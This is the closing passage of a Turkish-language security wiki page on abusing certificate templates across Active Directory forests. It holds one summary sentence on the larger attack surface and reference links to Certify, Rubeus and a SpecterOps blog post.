Her iki senaryo da bir forest'tan diğerine doğru **increase in the attack surface** ile sonuçlanır. Sertifika şablonunun ayarları, bir saldırgan tarafından yabancı bir domain'de ek ayrıcalıklar elde etmek için istismar edilebilir.

## Referanslar

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
